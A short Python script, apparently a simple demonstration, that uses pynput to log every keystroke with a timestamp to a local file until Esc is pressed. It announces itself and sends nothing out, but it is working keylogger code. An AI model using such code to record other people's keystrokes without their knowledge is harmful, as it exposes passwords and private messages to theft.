from pynput.keyboard import Key, Listener
from datetime import datetime

# Path to the log file
log_file = "keylog.txt"

def on_press(key):
    try:
        # Get the current time
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Write the pressed key and timestamp to the log file
        with open(log_file, "a") as f:
            f.write(f"{current_time}: {str(key)}\n")
    except Exception as e:
        print(str(e))

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

def main():
    print("Keylogger started. Press 'Esc' to stop.")

    # Start the listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
